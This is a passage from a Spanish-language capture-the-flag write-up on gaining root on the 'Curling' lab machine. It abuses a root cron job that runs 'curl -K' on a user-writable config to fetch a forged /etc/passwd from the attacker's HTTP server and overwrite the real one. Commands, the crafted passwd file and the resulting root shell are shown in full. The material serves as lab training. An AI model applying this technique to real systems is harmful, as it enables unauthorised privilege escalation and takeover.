2022/03/18 21:49:01 CMD: UID=0    PID=4438   | /bin/sh -c sleep 1; cat /root/default.txt > /home/floris/admin-area/input 
2022/03/18 21:49:01 CMD: UID=0    PID=4437   | /usr/sbin/CRON -f 
2022/03/18 21:49:01 CMD: UID=0    PID=4436   | /usr/sbin/CRON -f 
2022/03/18 21:49:01 CMD: UID=0    PID=4441   | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
 
^CExiting program... (interrupt)
floris@curling:/dev/shm$ 
```

Vemos que el usuario **root** (UID=0) está ejecutando el comando `/bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report`.  Tenemos que los archivos `input` y `report` el grupo asignado es **floris** y que tenemos permisos de escritura.

```bash
floris@curling:~$ ls -l
total 12
drwxr-x--- 2 root   floris 4096 May 22  2018 admin-area
-rw-r--r-- 1 floris floris 1076 May 22  2018 password_backup
-rw-r----- 1 floris floris   33 May 22  2018 user.txt
floris@curling:~$ cd admin-area/
floris@curling:~/admin-area$ ls -l
total 20
-rw-rw---- 1 root floris    25 Mar 18 22:00 input
-rw-rw---- 1 root floris 14236 Mar 18 22:00 report
floris@curling:~/admin-area$
floris@curling:~/admin-area$ cat input 
url = "http://127.0.0.1"
floris@curling:~/admin-area$
```

Si leemos el manual de `curl` y buscamos por el parámetro `-K`, tenemos lo siguiente:

```bash
# --- Example file ---
# this is a comment
url = "example.com"
output = "curlhere.html"
user-agent = "superagent/1.0"
```

Nos indica que podemos definiar una ruta donde se guarda la consulta realizada con `output` y pensando que se da prioridad a este parámetro en lugar de `-o`; podriamos tratar de coger el `/etc/passwd`, guardarlo en nuestra máquina y cambiar la contraseña de **root** para que posteriormente modificar el archivo `input` por nuestra dirección IP e indicarle que el resultado lo guarde en `/etc/passwd`.

Primero generamos una cadena de texto con `openssl` (para este caso la contraseña es *hola*):

```bash
❯ openssl passwd
Password: 
Verifying - Password: 
IB.plMO8N/x/E
```

Despúes nos copiamos el `/etc/passwd` de la máquina víctima y cambiamos el valor de **x** de **root** con nuestra cadena:

```bash
❯ cat passwd
───────┬────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: passwd
       │ Size: 1.6 KB
───────┼────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ root:IB.plMO8N/x/E:0:0:root:/root:/bin/bash
   2   │ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   3   │ bin:x:2:2:bin:/bin:/usr/sbin/nologin
   4   │ sys:x:3:3:sys:/dev:/usr/sbin/nologin
   5   │ sync:x:4:65534:sync:/bin:/bin/sync
   6   │ games:x:5:60:games:/usr/games:/usr/sbin/nologin
   7   │ man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
   8   │ lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
   9   │ mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
  10   │ news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
  11   │ uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
  12   │ proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
  13   │ www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  14   │ backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
  15   │ list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
  16   │ irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
  17   │ gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
  18   │ nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
  19   │ systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
  20   │ systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
  21   │ syslog:x:102:106::/home/syslog:/usr/sbin/nologin
  22   │ messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
  23   │ _apt:x:104:65534::/nonexistent:/usr/sbin/nologin
  24   │ lxd:x:105:65534::/var/lib/lxd/:/bin/false
  25   │ uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
  26   │ dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
  27   │ landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
  28   │ pollinate:x:109:1::/var/cache/pollinate:/bin/false
  29   │ sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
  30   │ floris:x:1000:1004:floris:/home/floris:/bin/bash
  31   │ mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
───────┴────────────────────────────────────────────────────────────────────────────────────────────────
```

Ahora compartimos un servidor HTTP con python y modificamos el valor del archivo `input`:

```bash
floris@curling:~/admin-area$ cat input
url = "http://10.10.14.27/passwd"
output = "/etc/passwd"

floris@curling:~/admin-area$
```

Esperamos a que se ejecute la tarea:

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.150 - - [18/Mar/2022 16:07:03] "GET /passwd HTTP/1.1" 200 -
```

Vemos que ya se realizó la solicitud, vamos a comprobar observando el `/etc/passwd` de la máquina víctima.

```bash
floris@curling:~/admin-area$ cat /etc/passwd
root:IB.plMO8N/x/E:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
floris:x:1000:1004:floris:/home/floris:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
floris@curling:~/admin-area$ 
```

Ahora ya podemos migrar al usuario **root** con la contraseña que definimos, en este caso **hola**:

```bash
floris@curling:~/admin-area$ su root
Password: 
root@curling:/home/floris/admin-area# whoami
root
root@curling:/home/floris/admin-area#
```

Ya somos el usuario **root** y podemos visualizar la flag (root.txt).
